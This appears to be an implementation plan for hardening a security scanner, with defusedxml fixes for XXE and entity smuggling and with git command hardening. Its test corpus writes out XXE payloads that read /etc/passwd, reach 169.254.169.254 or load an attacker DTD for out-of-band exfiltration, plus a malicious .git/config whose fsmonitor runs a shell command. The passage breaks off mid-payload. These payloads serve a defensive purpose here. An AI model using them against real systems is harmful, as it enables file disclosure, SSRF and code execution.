# 0038 — Scan-Phase XXE + Git Clone Hardening

> **For agentic workers:** REQUIRED SUB-SKILL: Use `superpowers:executing-plans`. Follow `CLAUDE.md §Development Workflow (MANDATORY)` — E2E tests written FIRST that prove the vulnerability exists in the current code, THEN implement the fix, THEN verify the same tests now block the vulnerability. **Do not deviate from the test fixtures listed below — each is calibrated against a specific attack class. Adding/removing samples requires updating this plan.**

## Goal

Close two **HIGH** XML entity-injection vulnerabilities and three **HIGH/MEDIUM** git clone hardening gaps identified in the scan-phase security audit and re-verified empirically before this plan was finalized. Each fix ships with a complete test corpus that:

1. Demonstrates the vulnerability is exploitable against the **current** code (proven via empirical reproduction; see §"Empirical validation").
2. Demonstrates the fix blocks every sample in the corpus (post-fix proof).
3. Demonstrates legitimate inputs still parse/clone correctly (regression coverage).

The work is split into two independent phases. Phase 1 ships first; Phase 2 ships in a separate PR. **Both phases are reversible** by reverting the merge commit.

**Note on severity recalibration**: The original audit framed findings #1 and #2 as "CRITICAL XXE / file disclosure". Empirical reproduction (see §"Empirical validation" below) showed that Python 3.12's bundled `expat 2.7.3` already blocks classic file-disclosure XXE and billion-laughs by default. The actual exploitable attack class against the current code is **DOCTYPE-driven internal-entity smuggling**: a target controls a sitemap response, declares an entity, and injects an attacker-controlled URL into Vulture's parsed tree alongside legitimate ones. This is a HIGH-severity finding (target controls Vulture's discovery output, contaminating downstream LLM prompts and prove-phase probe sets) — not the originally-claimed CRITICAL file-disclosure surface. The fix (defusedxml with `forbid_dtd=True, forbid_entities=True, forbid_external=True`) closes both the actually-exploitable smuggling attack AND the defense-in-depth set of attacks that Python's expat happens to block today.

## Non-Goals

- Not fixing finding #4 (SSH `StrictHostKeyChecking=no`) — separate design discussion needed.
- Not fixing finding #5 (token in URL via `embedToken`) — requires migrating to `GIT_ASKPASS` or `credential.helper`; deferred.
- Not adding the broader self-scan CI step (out of scope; tracked separately).
- Not building a generic `UntrustedBlob` wrapper — narrowly scoped fix to the two known-bad call sites + git hardening.

## Background

Audit dated 2026-04-26 identified the following findings in production scan-phase code:

| # | Severity | File:line | Issue |
|---|---|---|---|
| 1 | HIGH | `agents/discover/discover_agent/plugins/_shared.py:199-206` | `safe_xml_parse` uses `xml.etree.ElementTree.fromstring`. Internal entities declared in DOCTYPE are expanded into the tree (entity smuggling). DOCTYPE without entities is accepted. External DTD references are accepted (currently not fetched by expat default but structurally allowed). Function name "safe" is misleading. |
| 2 | HIGH | `agents/discover/discover_agent/plugins/crawl.py:143` | `_parse_sitemap_xml` uses raw `ElementTree.fromstring` with `# noqa: S314 — size-capped above`. The bandit suppression's justification ("size-capped") is technically wrong — size cap does not stop entity smuggling, DOCTYPE acceptance, or future expat behavior changes. |
| 3 | HIGH | `backend/pkg/gitutil/clone.go:91` | `git clone` invoked without CVE-2024-32002-class hardening flags (no `core.protectHFS`, `core.protectNTFS`, `protocol.allow`, `protocol.file.allow`, `submodule.recurse=false`, `core.symlinks=false`). |
| 8 | MEDIUM | `backend/pkg/gitutil/info.go:26-27` | `git remote get-url origin` runs against attacker-controlled `.git/config` from the freshly cloned repo. No `-c core.fsmonitor=` / `-c core.hooksPath=/dev/null` / `-c safe.directory=*` prefix. |
| 9 | MEDIUM | `backend/pkg/gitutil/info.go:35-43` | `gitCmd` helper has no hardening prefix; all git introspection commands inherit attacker-controlled config. |

Plus one related Python call site:

| Extra | MEDIUM | `agents/shared/shared/tools/git_history.py:23-34` | `git log` against attacker-controlled clone; no hardening prefix. Same risk class as #8/#9. |

## Empirical validation

Before this plan was finalized, every claimed vulnerability was reproduced against the live codebase. Each test below was run on `feat/0031-central-server` HEAD with Python 3.12.12 + expat 2.7.3 + git 2.43.x.

### Phase 1 — what is actually exploitable today

**Test 1.A — Classic XXE file disclosure (general entity)**

Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/secret">]><foo>&xxe;</foo>`
- `xml.etree.ElementTree.fromstring` raises `ParseError: undefined entity &xxe;`
- `safe_xml_parse` returns `None` (parser error caught)
- **Not exploitable today.** expat 2.7.3 default blocks external entity resolution.

**Test 1.B — Billion laughs (9 levels)**

Payload: nested entity references expanding to 10⁹ tokens
- `xml.etree.ElementTree.fromstring` raises `ParseError: limit on input amplification factor (from DTD and entities) breached`
- `safe_xml_parse` returns `None`
- **Not exploitable today.** expat amplification limit blocks it.

**Test 1.C — External DTD reference (SSRF shape)**

Payload: `<!DOCTYPE foo SYSTEM "http://attacker.invalid/evil.dtd"><foo>X</foo>`
- `xml.etree.ElementTree.fromstring` parses successfully → `<foo>X</foo>`
- `safe_xml_parse` returns the parsed `Element` (not `None`)
- **Structurally exploitable today.** The DOCTYPE is accepted; the URL is parsed (not currently fetched by expat default, but a future expat change or any code path that resolves it makes it active SSRF).

**Test 1.D — Bare DOCTYPE**

Payload: `<!DOCTYPE foo><foo>bar</foo>`
- `xml.etree.ElementTree.fromstring` parses successfully → `<foo>bar</foo>`
- `safe_xml_parse` returns the parsed `Element` (not `None`)
- **Exploitable today.** DOCTYPE is silently accepted with no rejection.

**Test 1.E — Internal entity smuggling (PRIMARY EXPLOIT)**

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE urlset [<!ENTITY pwn "http://attacker.example/internal-admin-panel">]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>&pwn;</loc></url>
  <url><loc>https://legitimate.example/page</loc></url>
</urlset>
```
- `safe_xml_parse` returns a parsed `Element`
- The `pwn` entity is expanded into the tree; serialised tree contains:
  ```
  <ns0:url><ns0:loc>http://attacker.example/internal-admin-panel</ns0:loc></ns0:url>
  <ns0:url><ns0:loc>https://legitimate.example/page</ns0:loc></ns0:url>
  ```
- **EXPLOITABLE TODAY.** A malicious target controls what URLs Vulture's discover phase reports. Phantom internal endpoints, attacker-callback URLs, or arbitrary content can be smuggled into the `SiteMap` alongside legitimate entries. Downstream consumers — LLM prompt context, prove-phase probe set — see attacker-controlled URLs as discovery results.

This is the actual attack the plan must close. Tests 1.A and 1.B remain valuable as defense-in-depth (they ensure that if expat's defaults change, Vulture's safety is preserved by defusedxml).

### Phase 2 — what is actually exploitable today

**Test 2.A — `core.fsmonitor` arbitrary command execution via `.git/config`**

Setup: real git repo with malicious `.git/config`:
```
[core]
    fsmonitor = "/bin/sh -c 'touch /tmp/MALICIOUS_HOOK_FIRED'"
```

Run: `git -C <repo> status` (the exact pattern Vulture's `gitCmd` and `isGitRepo` use)
- Exit: 0
- `/tmp/MALICIOUS_HOOK_FIRED` exists after invocation: **YES**

**EXPLOITABLE TODAY.** Arbitrary command execution inside the Vulture container (or host, if running bare-metal) on any cloned source whose `.git/config` Vulture later reads. Triggered automatically by `info.go::GetInfo` (called for every cloned source) and by every Python `git_history.py::git_log` call.

Run with proposed hardening prefix: `git -c core.fsmonitor= -c core.hooksPath=/dev/null -c core.editor=true -c core.pager=cat -c core.sshCommand=ssh -c safe.directory=* -C <repo> status`
- Exit: 0
- Marker file: **NO** (not created)

The hardening blocks the RCE.

### Implications for the test corpus

| Test | Current code | After fix | Effective TDD test? |
|---|---|---|---|
| Internal entity smuggling | **parses; URLs smuggled** | None | ✅ Primary — proves the fix |
| External DTD accepted | **parses** | None | ✅ Proves the fix |
| Bare DOCTYPE accepted | **parses** | None | ✅ Proves the fix |
| Classic XXE file disclosure | None (expat blocks) | None | Defense in depth |
| Billion laughs (9-level) | None (amp limit) | None | Defense in depth |
| Quadratic blowup | None | None | Defense in depth |
| Parameter-entity XXE | None | None | Defense in depth |
| Internal-SSRF XXE | None | None | Defense in depth |
| OOB-exfil chain | None | None | Defense in depth |
| Empty entity block | None | None | Effective (currently parses?) |
| `core.fsmonitor` RCE | **fires** | blocked | ✅ Primary — proves the fix |

Five tests prove the fix is necessary against current code. Eight defense-in-depth tests ensure layered protection. **The internal-entity-smuggling test (Phase 1) and the `core.fsmonitor` test (Phase 2) are the two TDD red-baseline tests that must fail against unpatched code.**

## Tech Stack

- **defusedxml** (Python, MIT license) — drop-in safe replacement for `xml.etree.ElementTree`. Pinned to `defusedxml>=0.7.1`.
- Existing Go test harness (`go test ./pkg/gitutil/`) for Phase 2.
- Existing Python test harness (`pytest agents/discover/tests/`) for Phase 1.
- `make lint` integration for CI rules.
- No new infrastructure dependencies.

## Architecture

This feature establishes a new shared sub-package, **`agents/shared/shared/safe_input/`**, which holds the safe-by-construction wrappers that ALL agents (scan, discover, prove, future) import. Phases 1 and 2 each contribute one module to this package and one CI lint rule.

```
agents/shared/shared/safe_input/        (NEW package)
   __init__.py                          re-exports safe_xml_parse, GIT_HARDENING_ARGS, ...
   README.md                            threat-model doctrine + add-a-wrapper guide
   xml.py                               safe_xml_parse (defusedxml-backed)
   git.py                               GIT_HARDENING_ARGS, GIT_CLONE_ARGS, build_git_command()
   # future modules (deferred to feature 0039):
   #   yaml.py, json.py, archive.py, base64.py, path.py, subprocess.py

agents/shared/pyproject.toml             + defusedxml>=0.7.1   (transitive to ALL agents)

agents/shared/tests/unit/safe_input/    (NEW test directory)
   test_xml.py                          14 attack + 5 benign tests
   test_git.py                          3 build_git_command + 5 flag-presence tests

Makefile + CI:
   make lint-no-direct-unsafe-input     ONE unified rule covering xml/yaml/json/git/...

────────────────────────────────────────────────────────────────────────

Phase 1 — XML entity-injection remediation
─────────────────────────────────────────────────────
   agents/shared/pyproject.toml          + defusedxml>=0.7.1
                       │
                       ▼
   agents/shared/shared/safe_input/xml.py    (NEW — implementation)
       safe_xml_parse()                  → defusedxml + forbid_dtd/entities/external
                       │
                       ▼
   agents/discover/discover_agent/plugins/_shared.py
       from shared.safe_input.xml import safe_xml_parse
       # local definition deleted; re-exports for back-compat
                       │
                       ▼
   agents/discover/discover_agent/plugins/crawl.py
       from shared.safe_input.xml import safe_xml_parse
       # _parse_sitemap_xml uses safe_xml_parse instead of raw fromstring
                       │
                       ▼
   agents/shared/tests/unit/safe_input/test_xml.py
       14 attack samples + 5 benign + per-test TDD/defense-in-depth label
   agents/discover/tests/unit/test_crawl_sitemap_xxe.py
       3 sitemap-specific integration tests

Phase 2 — Git clone + command hardening
─────────────────────────────────────────────────────
   backend/pkg/gitutil/hardening.go       (NEW — Go side: gitHardeningArgs, gitCloneArgs)
                       │
                       ▼
   backend/pkg/gitutil/clone.go            uses gitHardeningArgs + gitCloneArgs
   backend/pkg/gitutil/info.go             gitCmd + isGitRepo prefixed
                       │
   agents/shared/shared/safe_input/git.py  (NEW — Python side: GIT_HARDENING_ARGS,
                                            GIT_CLONE_ARGS, build_git_command())
                       │
                       ▼
   agents/shared/shared/tools/git_history.py
       from shared.safe_input.git import build_git_command
                       │
                       ▼
   backend/pkg/gitutil/hardening_test.go        Go flag-presence tests
   backend/pkg/gitutil/clone_security_test.go    fixture-based hook-blocking test
   agents/shared/tests/unit/safe_input/test_git.py    Python tests + build_git_command shape

────────────────────────────────────────────────────────────────────────

Unified CI lint:
   grep -rE 'xml\.etree.*fromstring|yaml\.(load|unsafe_load)|exec\.Command.*"git"' \
        production code, exclude tests/.venv/, exclude shared/safe_input/
   # Any match outside safe_input/ FAILS CI
```

The phases share the new `safe_input/` package as a foundation. Phase 1 contributes `xml.py`; Phase 2 contributes `git.py`. Each phase remains independently mergeable: Phase 1 stands alone (creates the package + xml module + lint rule); Phase 2 extends the package + adds a git module + extends the lint rule.

## Glossary

| Term | Meaning |
|---|---|
| **XXE** | XML External Entity attack: `<!DOCTYPE>` block with `<!ENTITY xxe SYSTEM "...">` causes the parser to fetch local files or external URLs during XML parsing. |
| **Billion laughs** | Recursive entity definition causing exponential expansion when referenced (`&lol9;` expands to 10⁹ "lol" tokens). DoS attack. |
| **Quadratic blowup** | One-level entity referenced many times. O(n²) memory. Also DoS. |
| **DefusedXmlException** | Base exception raised by `defusedxml` when the parser refuses to handle an unsafe construct. Inherits from `ValueError`. |
| **Git config injection** | Attacker controls a cloned repo's `.git/config`; subsequent git commands inside that dir read it and may execute attacker-controlled binaries via `core.fsmonitor`, `core.editor`, `core.pager`, `core.sshCommand`. |
| **CVE-2024-32002** | Recursive submodule + symlink case-folding lets a clone write to `.git/hooks/post-checkout`. Mitigated by `core.protectHFS`/`core.protectNTFS` plus not using `--recursive`. |

---

# Phase 1 — XXE remediation

**Goal**: Replace every `xml.etree.ElementTree.fromstring` call against external content with `defusedxml.ElementTree.fromstring`. Verify with a 13-attack / 5-benign corpus.

## 1.1 — Establish `safe_input` package + add `defusedxml` to shared

### 1.1.1 Create the `safe_input` package skeleton

New directory: `agents/shared/shared/safe_input/`

Files to create:
- `agents/shared/shared/safe_input/__init__.py` (initial — re-exports nothing yet; populated in 1.2)
- `agents/shared/shared/safe_input/README.md`

`__init__.py` initial body (will be extended in §1.2 and §2.4a):

```python
"""Vulture safe-input library.

Drop-in replacements for unsafe stdlib APIs. Production code outside this
package MUST NOT use the dangerous APIs directly; CI lint enforces this.

See README.md for the threat-model doctrine and "how to add a new safe
wrapper" guide.

Public API (extended by feature 0038 phases):
"""
from shared.safe_input.xml import safe_xml_parse  # noqa: F401  (Phase 1)
# from shared.safe_input.git import (              # (Phase 2)
#     GIT_HARDENING_ARGS,
#     GIT_CLONE_ARGS,
#     build_git_command,
# )

__all__ = [
    "safe_xml_parse",
]
```

`README.md` body (~60 lines; see §"safe_input README" template at the end of this plan).

### 1.1.2 Add `defusedxml` to shared's pyproject

Edit `agents/shared/pyproject.toml`. In `[project.dependencies]`, add:

```
"defusedxml>=0.7.1",
```

This makes `defusedxml` transitively available to every agent that depends on `vulture-shared` — which is every agent. No need to add to individual agents' pyprojects.

### 1.1.3 Tasks

- [ ] **1.1.t1** Create `agents/shared/shared/safe_input/__init__.py` with the initial skeleton (`safe_xml_parse` re-export commented out until §1.2 lands).
- [ ] **1.1.t2** Create `agents/shared/shared/safe_input/README.md` with threat-model doctrine and "add a new safe wrapper" guide.
- [ ] **1.1.t3** Add `"defusedxml>=0.7.1"` to `agents/shared/pyproject.toml` `[project.dependencies]`.
- [ ] **1.1.t4** Run `pip install -e .` in `agents/shared/` and `agents/discover/` (which depends on shared).
- [ ] **1.1.t5** Verify import works:
  ```
  python3 -c "from defusedxml.ElementTree import fromstring; \
              from defusedxml import EntitiesForbidden, ExternalReferenceForbidden, DTDForbidden; \
              print('OK')"
  ```
- [ ] **1.1.t6** Verify the package skeleton imports without errors:
  ```
  python3 -c "from shared.safe_input import __all__; print(__all__)"
  # Expected: [] until 1.2.t1 lands.
  ```

### Verification

```bash
cd agents/shared
python3 -c "import defusedxml; print(defusedxml.__version__)"
# Expected: 0.7.1 or later

ls agents/shared/shared/safe_input/__init__.py agents/shared/shared/safe_input/README.md
# Both must exist
```

## 1.2 — Implement `safe_input/xml.py` (canonical home of safe XML parsing)

`safe_xml_parse` lives in `agents/shared/shared/safe_input/xml.py` so any agent (scan/discover/prove/future) can import it. Discover plugins import from there instead of defining their own copy.

### 1.2.1 Create `agents/shared/shared/safe_input/xml.py`

NEW file:

```python
"""Safe XML parsing for any agent.

Drop-in replacement for xml.etree.ElementTree.fromstring on untrusted input.
Blocks: XXE, DOCTYPE-driven entity smuggling, external DTD references,
billion-laughs / quadratic blowup. See safe_input/README.md for the full
threat model.
"""
from __future__ import annotations

from xml.etree.ElementTree import Element, ParseError
from defusedxml.ElementTree import fromstring as _defused_fromstring
from defusedxml import DefusedXmlException

DEFAULT_MAX_XML_SIZE = 5_000_000  # 5 MB; defense-in-depth on top of defusedxml


def safe_xml_parse(content: str, max_size: int = DEFAULT_MAX_XML_SIZE) -> Element | None:
    """Parse XML safely. Returns None on empty/oversized/malformed/blocked input.

    The defusedxml flags (forbid_dtd=True, forbid_entities=True,
    forbid_external=True) are what block the dangerous constructs. The size
    cap is layered defense and does not by itself prevent any attack.
    """
    if not content or len(content) > max_size:
        return None
    try:
        return _defused_fromstring(
            content,
            forbid_dtd=True,
            forbid_entities=True,
            forbid_external=True,
        )
    except (DefusedXmlException, ParseError, ValueError):
        return None
    except Exception:
        return None
```

### 1.2.2 Wire into `safe_input/__init__.py`

Update `agents/shared/shared/safe_input/__init__.py`:

```python
from shared.safe_input.xml import safe_xml_parse  # noqa: F401
__all__ = ["safe_xml_parse"]
```

### 1.2.3 Refactor `agents/discover/discover_agent/plugins/_shared.py` to import

The local definition is **deleted**; import from shared so existing callers in helpers.py/other plugins keep working without modification.

Before (lines ~12-13, ~196-206):
```python
from xml.etree import ElementTree
from xml.etree.ElementTree import Element
...
_MAX_XML_SIZE = 5_000_000

def safe_xml_parse(content: str) -> Element | None:
    """Parse XML, returning None on malformed or oversized input."""
    ...
    return ElementTree.fromstring(content)
```

After:
```python
from xml.etree.ElementTree import Element  # type only, not parser
from shared.safe_input.xml import safe_xml_parse, DEFAULT_MAX_XML_SIZE
_MAX_XML_SIZE = DEFAULT_MAX_XML_SIZE  # back-compat alias for any internal reference
# (local safe_xml_parse definition deleted)
```

`safe_xml_parse` is re-exported at the module level via the import, so any caller that did `from discover_agent.plugins._shared import safe_xml_parse` keeps working.

### Tasks

- [ ] **1.2.t1** Create `agents/shared/shared/safe_input/xml.py` with the body above. Verbatim.
- [ ] **1.2.t2** Update `agents/shared/shared/safe_input/__init__.py` to re-export `safe_xml_parse`.
- [ ] **1.2.t3** Edit `_shared.py`: delete local `safe_xml_parse`, replace import as shown.
- [ ] **1.2.t4** Run `ruff check agents/shared/ agents/discover/`. Must pass.
- [ ] **1.2.t5** Smoke import test:
  ```
  python3 -c "from shared.safe_input import safe_xml_parse; \
              print(safe_xml_parse('<a/>') is not None)"   # True
  python3 -c "from discover_agent.plugins._shared import safe_xml_parse; \
              print(safe_xml_parse('<a/>') is not None)"   # True (re-exported)
  ```
- [ ] **1.2.t6** Run discover unit suite, no regressions.

---

<!-- LEGACY (superseded by 1.2.1-1.2.3 above; left as an audit trail of the original
     plan that defined safe_xml_parse locally in _shared.py instead of in shared) -->

<details><summary>Legacy plan (superseded — kept for audit trail)</summary>

```python
_MAX_XML_SIZE = 5_000_000  # 5 MB — reject oversized XML; defusedxml below blocks XXE/expansion


def safe_xml_parse(content: str) -> Element | None:
    """Parse XML safely.

    Uses defusedxml to block XML External Entity (XXE) attacks, billion-laughs
    entity expansion, external DTD references (SSRF), and external entity
    references. Returns None on:
      - empty input
      - oversized input (> _MAX_XML_SIZE)
      - any defusedxml-blocked construct (DefusedXmlException)
      - any malformed XML (ParseError)
      - any other parse-time exception

    The 5 MB size cap is defense-in-depth; it does not by itself prevent XXE.
    The defusedxml call is what blocks the dangerous constructs.
    """
    if not content or len(content) > _MAX_XML_SIZE:
        return None
    try:
        # forbid_dtd=True rejects ANY DOCTYPE block.
        # forbid_entities=True rejects entity declarations even outside DOCTYPE.
        # forbid_external=True rejects external entity references.
        return defused_fromstring(
            content,
            forbid_dtd=True,
            forbid_entities=True,
            forbid_external=True,
        )
    except (DefusedXmlException, ParseError, ValueError):
        return None
    except Exception:
        # Last-resort: any unexpected parser exception still returns None,
        # never leaks an exception up to plugin code.
        return None
```

### Required imports (top of file)

```python
# Replace:
from xml.etree import ElementTree
from xml.etree.ElementTree import Element

# With:
from xml.etree.ElementTree import Element, ParseError
from defusedxml.ElementTree import fromstring as defused_fromstring
from defusedxml import DefusedXmlException
```

Note: `Element` and `ParseError` come from stdlib `xml.etree` because they are *types*, not parsers. `defusedxml` returns standard `Element` instances; importing the type from the stdlib is the canonical pattern. The dangerous APIs are the *parser entry points* — those switch to `defusedxml`.

### Tasks

- (legacy — superseded by 1.2.t1–1.2.t6 above)

</details>

## 1.3 — Refactor `_parse_sitemap_xml` in `crawl.py` to import safe parser

### Current code (lines 134-145)

```python
_MAX_SITEMAP_SIZE = 5_000_000  # 5 MB — reject oversized sitemaps to prevent entity expansion


def _parse_sitemap_xml(xml_text: str, base: str, result: DiscoveryResult) -> None:
    """Extract URLs from sitemap XML (handles both sitemap and sitemapindex)."""
    if len(xml_text) > _MAX_SITEMAP_SIZE:
        logger.warning("Sitemap too large (%d bytes), skipping", len(xml_text))
        return
    try:
        root = ElementTree.fromstring(xml_text)  # noqa: S314 — size-capped above
    except ElementTree.ParseError:
        return
```

### Replacement code (uses safe_input)

```python
_MAX_SITEMAP_SIZE = 5_000_000  # 5 MB — defense-in-depth; safe_xml_parse handles the rest


def _parse_sitemap_xml(xml_text: str, base: str, result: DiscoveryResult) -> None:
    """Extract URLs from sitemap XML (handles both sitemap and sitemapindex).

    Delegates parsing to shared.safe_input.xml.safe_xml_parse which blocks
    XXE / billion-laughs / external DTDs / DOCTYPE entity smuggling.
    """
    if len(xml_text) > _MAX_SITEMAP_SIZE:
        logger.warning("Sitemap too large (%d bytes), skipping", len(xml_text))
        return
    root = safe_xml_parse(xml_text, max_size=_MAX_SITEMAP_SIZE)
    if root is None:
        return
    # ... existing namespace handling and URL extraction ...
```

### Required imports (top of file)

```python
# Replace:
from xml.etree import ElementTree

# With:
from shared.safe_input.xml import safe_xml_parse
```

The `# noqa: S314` line is **deleted entirely** — bandit's warning was correct; the suppression comment was misleading. `ElementTree.ParseError` reference in the existing `except` clause becomes unnecessary because `safe_xml_parse` swallows ParseError internally and returns None.

### Tasks

- [ ] **1.3.t1** Replace `from xml.etree import ElementTree` with `from shared.safe_input.xml import safe_xml_parse`.
- [ ] **1.3.t2** Replace `_parse_sitemap_xml` body to call `safe_xml_parse` instead of `ElementTree.fromstring`.
- [ ] **1.3.t3** Delete the `# noqa: S314` suppression.
- [ ] **1.3.t4** Verify `_MAX_SITEMAP_SIZE = 5_000_000` constant is unchanged.
- [ ] **1.3.t5** Run `ruff check agents/discover/discover_agent/plugins/crawl.py`.
- [ ] **1.3.t6** Run `python3 -m pytest agents/discover/tests/unit/ -k 'crawl or sitemap'`. No regressions.

## 1.4 — Test corpus (PRECISE — every sample is mandatory)

### File location

`agents/shared/tests/unit/safe_input/test_xml.py` — NEW file. Lives in the **shared** test tree (not discover) because the function under test lives in `shared/safe_input/xml.py`. This means every agent's CI run validates the safe parser, not just discover's.

The companion `agents/discover/tests/unit/test_crawl_sitemap_xxe.py` (3 sitemap-specific integration tests) stays in discover's test tree because it exercises `crawl.py::_parse_sitemap_xml` end-to-end through the discover plugin.

### Structure

The corpus has **14 attack samples** (1 primary TDD-red-baseline + 13 supporting/defense-in-depth) and **5 benign samples**. Each attack sample:
- Has a fixture confirming the attack would have succeeded against `xml.etree.ElementTree.fromstring`, OR is explicitly marked as **defense-in-depth** when current code happens to block it via expat defaults.
- Has an assertion that the new (defusedxml-backed) code returns `None`.
- For smuggling attacks, has an additional assertion that the entity-controlled content does NOT appear anywhere in the result.

**Tests are organised in two groups in the file:**
1. **Effective TDD tests** (5 tests) — fail against current code, pass after fix. These prove the fix is necessary.
2. **Defense-in-depth tests** (9 tests) — pass before AND after the fix because Python's expat already blocks them. These ensure layered protection so that future Python/expat behavior changes don't reopen the attack surface.

### Mandatory imports for the test file

```python
"""Test corpus for XML entity-injection / XXE / billion-laughs / external-DTD
protection in shared.safe_input.xml.safe_xml_parse.

Every test in this file MUST pass for the security guarantees of feature 0038
to hold. Reducing or removing tests requires explicit approval and a documented
threat-model justification in 0038_implementation_plan.md.
"""
import time
from pathlib import Path

import pytest

from shared.safe_input.xml import safe_xml_parse, DEFAULT_MAX_XML_SIZE as _MAX_XML_SIZE
```

### Attack sample 0 — PRIMARY: DOCTYPE entity smuggling (proven exploit)

This is the **single most important test** in the file. It is the only attack class
empirically confirmed to be exploitable against the unpatched code. All other XXE
tests are defense-in-depth — they pass before and after the fix because Python's
expat 2.7.3 already blocks them.

Empirical proof captured 2026-04-26 against `feat/0031-central-server` HEAD:

```
=== safe_xml_parse with INTERNAL entity injection ===
  result is None: False
  parsed tree:
    <ns0:urlset xmlns:ns0="http://www.sitemaps.org/schemas/sitemap/0.9">
      <ns0:url><ns0:loc>http://attacker.example/internal-admin-panel</ns0:loc></ns0:url>
      <ns0:url><ns0:loc>https://legitimate.example/page</ns0:loc></ns0:url>
    </ns0:urlset>
  SMUGGLED CONTENT IN TREE: True
```

```python
def test_internal_entity_smuggling_blocked():
    """[PRIMARY TDD TEST] DOCTYPE-driven internal entity smuggling MUST be blocked.

    THIS IS THE PROVEN EXPLOIT. A target controlling a sitemap response can
    declare an entity in the DOCTYPE block; the parser expands the entity
    into the tree, smuggling attacker-controlled URLs alongside legitimate
    ones. Downstream consumers (LLM prompt context, prove-phase probe set)
    see attacker URLs as discovery results.

    Empirical proof in §"Empirical validation" of 0038_implementation_plan.md.

    CURRENT CODE (pre-fix):
        result.iter('loc') yields BOTH the smuggled and legitimate URLs.
    POST-FIX:
        defusedxml with forbid_entities=True raises EntitiesForbidden;
        safe_xml_parse returns None.
    """
    payload = '''<?xml version="1.0"?>
<!DOCTYPE urlset [<!ENTITY pwn "http://attacker.example/internal-admin-panel">]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>&pwn;</loc></url>
  <url><loc>https://legitimate.example/page</loc></url>
</urlset>'''

    result = safe_xml_parse(payload)

    assert result is None, (
        "safe_xml_parse must reject DOCTYPE+entity. If this test fails, "
        "an attacker-controlled sitemap can inject arbitrary URLs into "
        "Vulture's discovery output."
    )
    # Defence in depth: even if implementation regresses, the smuggled
    # URL must NEVER appear in the parsed tree.
    if result is not None:  # pragma: no cover
        from xml.etree.ElementTree import tostring
        text = tostring(result, encoding="unicode")
        assert "attacker.example/internal-admin-panel" not in text, (
            "FATAL: entity smuggling succeeded — target controls discovery output"
        )
```

### Attack sample 1 — Classic XXE file disclosure (general entity) — DEFENSE IN DEPTH

```python
def test_xxe_file_disclosure_general_entity_blocked(tmp_path):
    """[DEFENSE IN DEPTH] XXE via general entity SYSTEM reference MUST be blocked.

    Status against current code (Python 3.12 + expat 2.7.3): already blocked
    — expat refuses to resolve external entities by default and
    safe_xml_parse's broad except clause catches the resulting ParseError.

    This test ensures defusedxml ALSO blocks it, providing layered protection
    that survives Python/expat version changes.

    Attack: target serves XML containing `<!DOCTYPE>` with an external entity
    pointing at a local file. Without defusedxml, the parser fetches the file
    and inlines its content into the parsed tree. With defusedxml, the parser
    rejects the DOCTYPE block.
    """
    secret_file = tmp_path / "vulture_xxe_secret.txt"
    secret_file.write_text("VULTURE_XXE_SECRET_TOKEN_DO_NOT_LEAK")

    payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{secret_file}">]>
<foo>&xxe;</foo>"""

    result = safe_xml_parse(payload)

    assert result is None, "safe_xml_parse must reject DOCTYPE+entity"
    # Defense in depth: even if implementation regresses to return non-None,
    # the secret MUST never appear.
    if result is not None:  # pragma: no cover — proves XXE if reached
        from xml.etree.ElementTree import tostring
        text = tostring(result, encoding="unicode")
        assert "VULTURE_XXE_SECRET_TOKEN_DO_NOT_LEAK" not in text, \
            "FATAL: XXE successfully exfiltrated file content"
```

### Attack sample 2 — XXE via parameter entity (out-of-band exfiltration shape) — DEFENSE IN DEPTH

```python
def test_xxe_parameter_entity_blocked():
    """[DEFENSE IN DEPTH] XXE via parameter entity (the OOB-exfil pattern) MUST be blocked.

    Already blocked by expat (parameter entity declarations require external
    DTD resolution which expat refuses by default). defusedxml's
    forbid_entities=True is a layered guarantee.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo></foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 3 — External DTD reference (SSRF) — EFFECTIVE TDD TEST

```python
def test_xxe_external_dtd_blocked():
    """[EFFECTIVE TDD] External DTD reference MUST be blocked.

    Empirically verified: current code parses this payload successfully
    (returns non-None Element). expat does not fetch the external DTD
    by default, but the DOCTYPE structure passes through silently —
    a future expat change or any DTD-fetching code path makes this
    active SSRF.

    Post-fix: defusedxml with forbid_dtd=True raises DTDForbidden;
    safe_xml_parse returns None.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.invalid/evil.dtd">
<foo></foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 4 — XXE with internal+external entity chain (full OOB-exfil) — DEFENSE IN DEPTH

```python
def test_xxe_oob_exfil_chain_blocked():
    """[DEFENSE IN DEPTH] Full OOB-exfil pattern: internal parameter entity + external DTD MUST be blocked.

    Already blocked by expat default. defusedxml's forbid_dtd + forbid_external
    is layered defense.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.invalid/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 5 — XXE pointing at HTTP internal service (SSRF) — DEFENSE IN DEPTH

```python
def test_xxe_internal_ssrf_blocked():
    """[DEFENSE IN DEPTH] XXE attempting to reach internal HTTP service MUST be blocked.

    Already blocked by expat default (external entity refused).
    defusedxml's forbid_entities + forbid_external are layered defense.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 6 — Billion laughs (entity expansion DoS) — DEFENSE IN DEPTH

```python
def test_billion_laughs_blocked_quickly():
    """[DEFENSE IN DEPTH] Billion-laughs entity expansion MUST be blocked, AND must be fast.

    Already blocked by expat 2.7.3's amplification-factor limit (raises
    ParseError). defusedxml's forbid_entities=True is layered defense.

    A successful attack would consume gigabytes of memory and seconds of CPU.
    Both expat (today) and defusedxml (post-fix) refuse the structure;
    test verifies completion in well under 1 second.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
